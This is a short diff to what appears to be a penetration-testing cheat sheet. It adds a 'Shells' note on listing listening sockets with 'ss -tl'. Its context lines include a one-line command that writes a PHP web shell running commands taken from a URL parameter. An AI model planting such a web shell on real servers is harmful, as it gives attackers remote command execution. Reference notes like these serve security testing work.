@@ -158,3 +158,7 @@ echo 'kali:kali' | sudo chpasswd
 ## Injection
 ### PHP
   ```echo '<?php system($_GET["cmd"]); ?>' > shell.php```
+
+## Shells
+* Network traffic and process name
+  ```ss -tl```
